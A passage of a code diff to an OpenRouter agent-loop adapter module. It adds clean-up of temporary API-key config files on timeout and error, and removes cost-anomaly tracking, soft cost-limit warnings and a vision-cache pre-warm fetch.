+                    else
+                        proc.kill("SIGTERM");
+                }
+                catch {
+                    try {
+                        proc.kill("SIGTERM");
+                    }
+                    catch { /* M-19: process may have already exited */ }
+                }
+                return;
+            }
+            if (responseTruncated)
+                return;
             stdoutBuffer +=
                 typeof chunk === "string" ? chunk : chunk.toString("utf8");
             if (stdoutBuffer.length > MAX_STDOUT_BUFFER_BYTES) {
@@ -2327,6 +2226,13 @@ export async function executeAgentLoop(ctx) {
                 }
             }
             if (timedOut) {
+                // Clean up config temp file containing API keys (audit B-05)
+                if (configFilePath) {
+                    fs.unlink(configFilePath).catch(() => { });
+                }
+                if (ephemeralSkillsDir) {
+                    fs.rm(ephemeralSkillsDir.dir, { recursive: true, force: true }).catch(() => { });
+                }
                 settle({
                     exitCode: null,
                     signal: "SIGTERM",
@@ -2371,11 +2277,6 @@ export async function executeAgentLoop(ctx) {
                 exitCode: code,
                 signal: null,
             });
-            const spawnCostUsd = spawnResult.costUsd ?? 0;
-            if (maxCostUsdSoft !== undefined && spawnCostUsd >= maxCostUsdSoft) {
-                structuredLog({ level: "warn", ts: Date.now(), event: "soft_cost_limit", agentId: agent.id, runId, costUsd: spawnCostUsd, message: `Run cost $${spawnCostUsd.toFixed(4)} exceeded soft limit $${maxCostUsdSoft}` });
-                void onLog("stderr", `[openrouter adapter] soft cost limit reached ($${spawnCostUsd.toFixed(4)} >= $${maxCostUsdSoft}) — consider adjusting maxCostUsd\n`);
-            }
             // Apply question event
             const finalResult = {
                 ...spawnResult,
@@ -2397,13 +2298,10 @@ export async function executeAgentLoop(ctx) {
                 cachedInputTokens: spawnResult.usage?.cachedInputTokens,
                 cacheWriteInputTokens: typeof spawnResult.resultJson?.cacheWriteInputTokens === "number" ? spawnResult.resultJson.cacheWriteInputTokens : undefined,
                 cacheHitRatio: typeof spawnResult.resultJson?.cacheHitRatio === "number" ? spawnResult.resultJson.cacheHitRatio : undefined,
-                costUsd: spawnCostUsd,
+                costUsd: spawnResult.costUsd ?? 0,
                 turnCount: typeof spawnResult.resultJson?.turnCount === "number" ? spawnResult.resultJson.turnCount : undefined,
                 subtype: typeof spawnResult.resultJson?.subtype === "string" ? spawnResult.resultJson.subtype : undefined,
             });
-            // Cost anomaly detection
-            recordRunCost(spawnCostUsd);
-            checkCostAnomaly(spawnCostUsd, agent.id, runId, onLog);
             // Clean up ephemeral skills dir now that the run is complete
             if (ephemeralSkillsDir)
                 void cleanupOragerSkillsDir(ephemeralSkillsDir.dir);
@@ -2414,6 +2312,13 @@ export async function executeAgentLoop(ctx) {
                 clearTimeout(timeoutTimer);
             if (graceTimer !== undefined)
                 clearTimeout(graceTimer);
+            // Clean up config temp file containing API keys (audit B-05)
+            if (configFilePath) {
+                fs.unlink(configFilePath).catch(() => { });
+            }
+            if (ephemeralSkillsDir) {
+                fs.rm(ephemeralSkillsDir.dir, { recursive: true, force: true }).catch(() => { });
+            }
             settle({
                 exitCode: 1,
                 signal: null,
@@ -2426,46 +2331,18 @@ export async function executeAgentLoop(ctx) {
 }
 // ── Test helpers (exported for unit tests only) ───────────────────────────────
 export function _resetStateForTesting() {
-    _costWindow.length = 0;
-    _runsSinceLastAnomaly = COST_ANOMALY_COOLDOWN_RUNS; // reset cooldown to "ready"
-    _visionCache.clear();
     _daemonCircuitState.clear();
     _lastAutoStartAttemptMs = 0;
-    _structuredLogBuffer.length = 0;
+    _structuredLogBuffer.clear();
+    _skillsDirChecked = false;
+    _skillsDirValid = false;
     _resetModelCacheForTesting();
 }
 /** Drain and return all structured log entries captured since the last reset. */
 export function _drainStructuredLogForTesting() {
-    return _structuredLogBuffer.splice(0);
+    const entries = _structuredLogBuffer.toArray();
+    _structuredLogBuffer.clear();
+    return entries;
 }
-export { buildApiKeyPool, recordRunCost, checkCostAnomaly, DEFAULT_MODEL, DAEMON_KEY_PATH, DAEMON_KEY_MAX_AGE_MS, isDaemonCircuitOpen, recordDaemonFailure, recordDaemonSuccess, DAEMON_CB_THRESHOLD, DAEMON_CB_RESET_MS, buildAdapterResult, processRateLimitTracker, _lastAutoStartAttemptMs, AUTO_START_COOLDOWN_MS, COST_ANOMALY_COOLDOWN_RUNS, };
-// ── Vision cache pre-warm ─────────────────────────────────────────────────
-// When the live model list is already populated (e.g. from a prior
-// listOpenRouterModels() call triggered by the UI dropdown), the vision
-// cache is filled for free. This background fetch ensures the cache is
-// warm for the first run even when the UI has not requested the model list.
-// Non-fatal: failures are silently ignored so they never affect a run.
-(async () => {
-    const apiKey = process.env.OPENROUTER_API_KEY ?? "";
-    if (!apiKey)
-        return;
-    const base = (process.env.OPENROUTER_BASE_URL ?? "https://openrouter.ai/api/v1").replace(/\/$/, "");
-    try {
-        const res = await fetch(`${base}/models`, {
-            headers: { Authorization: `Bearer ${apiKey}` },
-            signal: AbortSignal.timeout(10_000),
-        });
-        if (!res.ok)
-            return;
-        const json = await res.json();
-        for (const entry of json.data ?? []) {
-            const modalities = entry.input_modalities ?? entry.architecture?.input_modalities ?? [];
-            const supported = modalities.includes("image");
-            _visionCache.set(entry.id, { supported, ts: Date.now() });
-        }
-    }
-    catch {
-        // Never fail module load due to a pre-warm error
-    }
-})();
+export { buildApiKeyPool, DEFAULT_MODEL, DAEMON_KEY_PATH, DAEMON_KEY_MAX_AGE_MS, isDaemonCircuitOpen, recordDaemonFailure, recordDaemonSuccess, DAEMON_CB_THRESHOLD, DAEMON_CB_RESET_MS, buildAdapterResult, processRateLimitTracker, _lastAutoStartAttemptMs, AUTO_START_COOLDOWN_MS, };
 //# sourceMappingURL=execute-cli.js.map
